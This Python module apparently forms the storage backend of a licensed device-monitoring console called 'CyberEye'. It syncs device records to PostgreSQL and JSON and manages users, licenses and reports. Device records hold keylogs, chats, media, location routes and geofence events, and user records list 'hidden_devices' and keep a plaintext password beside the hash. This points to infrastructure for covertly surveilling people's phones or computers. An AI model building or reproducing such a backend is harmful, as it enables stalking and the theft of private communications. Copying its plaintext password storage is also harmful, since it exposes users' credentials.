import os
import json
import logging
import threading
from config import DB_FILE, USERS_DB_FILE, BLACKLIST, DATABASE_URL, REDIS_URL
from core.models import User, License, Device, Report, SystemPolicy, init_db

logger = logging.getLogger("database")

# Thread-safe write lock
db_lock = threading.RLock()

# Shared In-Memory Tracking Maps
connected_devices = {}
sid_to_device = {}
connected_device_licenses = {}
data_cache = {}

# PostgreSQL / SQLAlchemy Session Factory
SessionLocal = None
engine = None
redis_client = None

def init_postgres():
    """Initializes PostgreSQL connection and creates tables if DATABASE_URL is available."""
    global engine, SessionLocal
    if not DATABASE_URL:
        return False
    try:
        from sqlalchemy import create_engine
        from sqlalchemy.orm import sessionmaker

        # Configure connection pool for high concurrency
        engine = create_engine(
            DATABASE_URL,
            pool_size=20,
            max_overflow=30,
            pool_recycle=1800,
            pool_pre_ping=True
        )
        init_db(engine)
        SessionLocal = sessionmaker(bind=engine, autoflush=False, expire_on_commit=False)
        print("[Database] Connected to PostgreSQL successfully. Relational tables ready.")
        return True
    except Exception as e:
        print(f"[Database] PostgreSQL connection failed ({e}). Falling back to local storage.")
        engine = None
        SessionLocal = None
        return False

def init_redis():
    """Initializes Redis connection if REDIS_URL is available."""
    global redis_client
    if not REDIS_URL:
        return None
    try:
        import redis
        client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
        client.ping()
        print("[Database] Connected to Redis successfully. Fast cache & socket broker ready.")
        return client
    except Exception as e:
        print(f"[Database] Redis connection failed ({e}). Using in-memory dictionary for sockets.")
        return None

# Attempt connections
init_postgres()
redis_client = init_redis()

class DeviceDatabaseProxy(dict):
    """
    Transparent Dictionary Proxy for Devices:
    Maintains 100% backwards compatibility with database[device_id] syntax
    while persisting to PostgreSQL and Redis behind the scenes.
    """
    def __init__(self):
        super().__init__()

    def save_device_to_postgres(self, device_id):
        if not SessionLocal:
            return
        data = self.get(device_id)
        if not data or not isinstance(data, dict):
            return
        try:
            with SessionLocal() as session:
                dev = session.query(Device).filter_by(device_id=device_id).first()
                if not dev:
                    dev = Device(device_id=device_id)
                    session.add(dev)
                dev.license_key = data.get("license_key")
                dev.info = str(data.get("info", ""))
                dev.logs = data.get("logs", [])
                dev.refs = data.get("refs", {})
                dev.last_seen = int(data.get("lastSeen", 0))
                dev.settings = data.get("settings", {})
                dev.last_geofence_states = data.get("last_geofence_states", {})
                dev.geofence_events = data.get("geofence_events", [])
                dev.today_route = data.get("today_route", [])
                dev.today_route_date = str(data.get("today_route_date", ""))
                dev.route_history = data.get("route_history", [])
                dev.keylogs = data.get("keylogs", {})
                dev.chats = data.get("chats", {})
                dev.media = data.get("media", {})
                session.commit()
        except Exception as e:
            print(f"[Database/Postgres] Error syncing device {device_id}: {e}")

    def sync_all_to_postgres(self):
        if not SessionLocal:
            return
        for device_id in list(self.keys()):
            self.save_device_to_postgres(device_id)

    def load_from_postgres(self):
        if not SessionLocal:
            return False
        try:
            with SessionLocal() as session:
                devices = session.query(Device).all()
                loaded = {}
                for dev in devices:
                    loaded[dev.device_id] = dev.to_dict()
                if loaded:
                    self.clear()
                    self.update(loaded)
                    print(f"[Database/Postgres] Loaded {len(loaded)} devices from PostgreSQL.")
                    return True
        except Exception as e:
            print(f"[Database/Postgres] Error reading devices: {e}")
        return False

class UsersDatabaseProxy(dict):
    """
    Transparent Dictionary Proxy for Users, Licenses, Reports, and System Policies.
    """
    def __init__(self):
        super().__init__()
        self["users"] = {}
        self["licenses"] = {}
        self["reports"] = []
        self["system_policy"] = {
            "maintenance_mode": False,
            "maintenance_message": "Scheduled updates are in progress. CyberEye console will be back online shortly.",
            "maintenance_until": 0
        }

    def load_from_postgres(self):
        if not SessionLocal:
            return False
        try:
            with SessionLocal() as session:
                # Load Users
                users = session.query(User).all()
                users_map = {u.username: u.to_dict() for u in users}
                
                # Load Licenses
                licenses = session.query(License).all()
                licenses_map = {l.license_key: l.to_dict() for l in licenses}
                
                # Load Reports
                reports = session.query(Report).all()
                reports_list = [r.to_dict() for r in reports]
                
                # Load System Policy
                policy = session.query(SystemPolicy).filter_by(key='main').first()
                policy_dict = policy.to_dict() if policy else {
                    "maintenance_mode": False,
                    "maintenance_message": "Scheduled updates are in progress. CyberEye console will be back online shortly.",
                    "maintenance_until": 0
                }

                if users_map or licenses_map:
                    self["users"] = users_map
                    self["licenses"] = licenses_map
                    self["reports"] = reports_list
                    self["system_policy"] = policy_dict
                    print(f"[Database/Postgres] Loaded {len(users_map)} users and {len(licenses_map)} licenses.")
                    return True
        except Exception as e:
            print(f"[Database/Postgres] Error reading users from PostgreSQL: {e}")
        return False

    def sync_to_postgres(self):
        if not SessionLocal:
            return
        try:
            with SessionLocal() as session:
                # 1. Sync Users
                for uname, udata in self.get("users", {}).items():
                    user = session.query(User).filter_by(username=uname).first()
                    if not user:
                        user = User(username=uname, password_hash=udata.get("password_hash", ""))
                        session.add(user)
                    user.password_hash = udata.get("password_hash", "")
                    user.plain_password = udata.get("plain_password", "")
                    user.role = udata.get("role", "user")
                    user.devices = udata.get("devices", [])
                    user.hidden_devices = udata.get("hidden_devices", [])
                    user.last_seen = int(udata.get("last_seen", 0))

                # 2. Sync Licenses
                for lkey, ldata in self.get("licenses", {}).items():
                    lic = session.query(License).filter_by(license_key=lkey).first()
                    if not lic:
                        lic = License(
                            license_key=lkey,
                            expires_at=int(ldata.get("expires_at", 0)),
                            created_at=int(ldata.get("created_at", 0))
                        )
                        session.add(lic)
                    lic.assigned_to = ldata.get("assigned_to")
                    lic.expires_at = int(ldata.get("expires_at", 0))
                    lic.is_active = bool(ldata.get("is_active", True))

                # 3. Sync System Policy
                pdata = self.get("system_policy", {})
                policy = session.query(SystemPolicy).filter_by(key='main').first()
                if not policy:
                    policy = SystemPolicy(key='main')
                    session.add(policy)
                policy.maintenance_mode = bool(pdata.get("maintenance_mode", False))
                policy.maintenance_message = str(pdata.get("maintenance_message", ""))
                policy.maintenance_until = int(pdata.get("maintenance_until", 0))

                # 4. Sync Reports
                for rdata in self.get("reports", []):
                    rid = rdata.get("id")
                    if rid:
                        rep = session.query(Report).filter_by(id=rid).first()
                        if not rep:
                            rep = Report(id=rid, issue_text=rdata.get("issue_text", ""))
                            session.add(rep)
                        rep.username = rdata.get("username")
                        rep.license_key = rdata.get("license_key")
                        rep.issue_text = rdata.get("issue_text", "")
                        rep.timestamp = int(rdata.get("timestamp", 0))
                        rep.status = rdata.get("status", "pending")

                session.commit()
        except Exception as e:
            print(f"[Database/Postgres] Error syncing users/licenses: {e}")

# Global Proxied Database Instances
database = DeviceDatabaseProxy()
users_database = UsersDatabaseProxy()

def load_db():
    with db_lock:
        # 1. Try PostgreSQL first
        if database.load_from_postgres():
            return
        
        # 2. Fallback to JSON file if not a directory
        if os.path.exists(DB_FILE) and os.path.isfile(DB_FILE):
            try:
                with open(DB_FILE, 'r', encoding='utf-8') as f:
                    loaded = json.load(f)
                    for b in BLACKLIST:
                        for k in list(loaded.keys()):
                            if b in k.lower():
                                del loaded[k]
                    database.clear()
                    database.update(loaded)
                    # Migrate to PostgreSQL if connected
                    if SessionLocal:
                        database.sync_all_to_postgres()
            except Exception as e:
                print(f"[Database] Error reading {DB_FILE}: {e}")
                database.clear()
        else:
            database.clear()

def save_db():
    with db_lock:
        # 1. Persist to PostgreSQL if available
        if SessionLocal:
            database.sync_all_to_postgres()
        
        # 2. Backup to JSON file if not a directory
        if not os.path.isdir(DB_FILE):
            try:
                with open(DB_FILE, 'w', encoding='utf-8') as f:
                    json.dump(dict(database), f, indent=2, ensure_ascii=False)
            except Exception:
                pass

def load_users_db():
    with db_lock:
        # 1. Try PostgreSQL first
        if users_database.load_from_postgres():
            return

        # 2. Fallback to JSON file
        if os.path.exists(USERS_DB_FILE) and os.path.isfile(USERS_DB_FILE):
            try:
                with open(USERS_DB_FILE, 'r', encoding='utf-8') as f:
                    loaded = json.load(f)
                    if "users" not in loaded: loaded["users"] = {}
                    if "licenses" not in loaded: loaded["licenses"] = {}
                    if "reports" not in loaded: loaded["reports"] = []
                    if "system_policy" not in loaded:
                        loaded["system_policy"] = {
                            "maintenance_mode": False,
                            "maintenance_message": "Scheduled updates are in progress. CyberEye console will be back online shortly.",
                            "maintenance_until": 0
                        }
                    users_database.clear()
                    users_database.update(loaded)
                    # Migrate to PostgreSQL if connected
                    if SessionLocal:
                        users_database.sync_to_postgres()
            except Exception as e:
                print(f"[Database] Error reading {USERS_DB_FILE}: {e}")
        else:
            save_users_db()

def save_users_db():
    with db_lock:
        # 1. Persist to PostgreSQL if available
        if SessionLocal:
            users_database.sync_to_postgres()

        # 2. Backup to JSON file
        if not os.path.isdir(USERS_DB_FILE):
            try:
                with open(USERS_DB_FILE, 'w', encoding='utf-8') as f:
                    json.dump(dict(users_database), f, indent=2, ensure_ascii=False)
            except Exception:
                pass

# Initialize databases on import
load_db()
load_users_db()
